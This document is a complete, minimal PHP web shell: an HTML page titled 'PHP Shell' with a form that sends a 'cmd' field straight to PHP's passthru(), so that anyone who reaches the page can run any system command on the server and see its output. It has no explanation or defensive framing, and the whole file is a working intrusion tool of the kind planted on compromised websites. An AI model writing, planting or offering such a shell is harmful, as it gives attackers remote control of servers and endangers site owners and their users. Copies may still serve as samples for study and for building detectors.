<html>
 <head>
  <title>PHP Shell</title>
 </head>
 <body>
 <form action="" method="post">
 <input type="text" name="cmd" />
 <input type="submit" value=".:"/>
</form>
<pre>
<?php echo passthru($_POST["cmd"]); ?>
</pre>
</body>
</html>
